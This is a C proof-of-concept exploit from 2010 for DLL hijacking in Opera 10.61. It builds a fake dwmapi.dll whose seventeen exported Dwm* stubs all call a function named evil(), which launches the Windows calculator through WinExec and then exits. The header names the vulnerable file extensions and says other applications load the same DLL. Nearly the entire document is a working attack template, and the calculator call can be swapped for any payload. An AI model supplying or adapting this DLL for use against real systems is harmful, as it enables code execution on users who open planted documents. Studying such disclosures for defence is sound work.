/* 
Exploit Title: Opera DLL Hijacking Exploit ( dwmapi.dll )
Date: 24/08/2010
Author: Nicolas Krassas 
http://twitter.com/Dinosn
Version: Opera 10.61
Tested on: Windows XP SP3
The code is based on the exploit from "TheLeader"
Vulnerable extensions: .htm .mht .mhtml .xht .xhtm .xhtl
dwmapi.dll is used in other applications too
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void  DwmDefWindowProc() { evil(); }
DLLIMPORT void  DwmEnableBlurBehindWindow() { evil(); }
DLLIMPORT void  DwmEnableComposition() { evil(); }
DLLIMPORT void  DwmEnableMMCSS() { evil(); }
DLLIMPORT void  DwmExtendFrameIntoClientArea() { evil(); }
DLLIMPORT void  DwmGetColorizationColor() { evil(); }
DLLIMPORT void  DwmGetCompositionTimingInfo() { evil(); }
DLLIMPORT void  DwmGetWindowAttribute() { evil(); }
DLLIMPORT void  DwmIsCompositionEnabled() { evil(); }
DLLIMPORT void  DwmModifyPreviousDxFrameDuration() { evil(); }
DLLIMPORT void  DwmQueryThumbnailSourceSize() { evil(); }
DLLIMPORT void  DwmRegisterThumbnail() { evil(); }
DLLIMPORT void  DwmSetDxFrameDuration() { evil(); }
DLLIMPORT void  DwmSetPresentParameters() { evil(); }
DLLIMPORT void  DwmSetWindowAttribute() { evil(); }
DLLIMPORT void  DwmUnregisterThumbnail() { evil(); }
DLLIMPORT void  DwmUpdateThumbnailProperties() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}
